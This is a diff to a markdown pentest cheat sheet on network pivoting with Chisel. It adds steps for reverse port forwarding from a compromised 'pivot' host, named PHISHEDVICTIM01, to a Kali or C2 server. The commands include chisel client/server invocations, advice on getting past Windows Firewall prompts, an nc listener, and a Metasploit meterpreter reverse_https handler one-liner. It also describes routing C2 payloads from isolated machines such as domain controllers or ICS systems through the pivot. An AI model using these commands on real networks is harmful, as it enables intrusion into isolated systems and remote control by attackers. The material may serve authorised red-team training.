@@ -56,8 +56,9 @@ sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
 ## Chisel
 * **Recommended** and does not need root on pivot machine) [^5]
 * Alternative for SSH(Local, Remote and Dynamic) especially on pivoting machines
-   * Built on Go
-   * Has ready made binary releases on Github which works on a lot of Operating Systems[^6]
+    * Built on Go
+    * Has ready made binary releases on Github which works on a lot of Operating Systems[^6]
+        * Better to compile though
    
 ```bash
 # Server (On your attacking machine[Kali])
@@ -67,13 +68,36 @@ sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
 ## Listen on Kali 4444/tcp, forward to 10.10.10.240 port 80
 ./chisel client -v <YOUR_KALI_IP>:8000 R:4444:10.10.10.240:80
 
-# Remote Forwarding (for reverse connections [i.e. reverse_tcp])
-## (Commonly on the 1st compromised machine [Pivot Machine])
-## The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
-./chisel client -v <YOUR_KALI_IP>:8000 3333:127.0.0.1:3333
-## After the command above, execute the command below on your Kali machine or something similar (.e. exploit/multi/handler)
-nc -lnvp 3333
 ```
+* Remote/Reverse Forwarding (for *reverse connections* [i.e. reverse_tcp])
+    * Quick Diagrams for the visual people
+        * [INTERNET_ISOLATED_MACHINE] --> [Pivot_Machine] --(FIREWALL)--(INTERNET)-- [C2/Kali]
+        * making it seamless as if:
+        * [INTERNET_ISOLATED_MACHINE] =============================================> [C2/Kali]
+    * From Kali: `./chisel server -v -p 8000 --reverse` From C2: `./chisel server -v -p 443 --reverse` 
+    * Commonly on the 1st compromised machine [Pivot Machine]
+        * Let us call this [Pivot Machine]: *PHISHEDVICTIM01.acme.local*
+        * *BEWARE*: May trigger _Windows Firewall Allow/Deny_ pop-up window on this host upon running. May need to allow first or create a manual firewall entry via cli or choose a firewall port already allowed but unused by a service.
+        * The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
+            ```batch
+            chisel.exe client -v <YOUR_KALI_IP>:8000  3333:127.0.0.1:3333
+            #OR
+            chisel.exe client -v <YOUR_C2_domain>:443 3333:127.0.0.1:3333
+            ```
+    * After the command above, execute the command below on your Kali/c2 machine or something similar (i.e. `exploit/multi/handler`)
+        ```bash
+        nc -lnvp 3333
+        #OR
+        msfconsole -q -x "use exploit/multi/handler;set LPORT 3333; set LHOST eth0; set payload windows/x64/meterpreter/reverse_https;run -jz"
+        ```
+    * Now on the isolated target/victim machine (without direct connection to your C2/Kali) like the DC or ICS.
+        * Test
+            ```batch
+            curl.exe PHISHEDVICTIM01.acme.local:3333
+            ```
+        * Use a one-liner powershell
+        * C2 payload to point to `PHISHEDVICTIM01.acme.local:3333`
+
 * Chisel Socks Proxy
     * Using `reverse` command
         1. On the server (C2[cloud] / Kali VM[internal/labs])
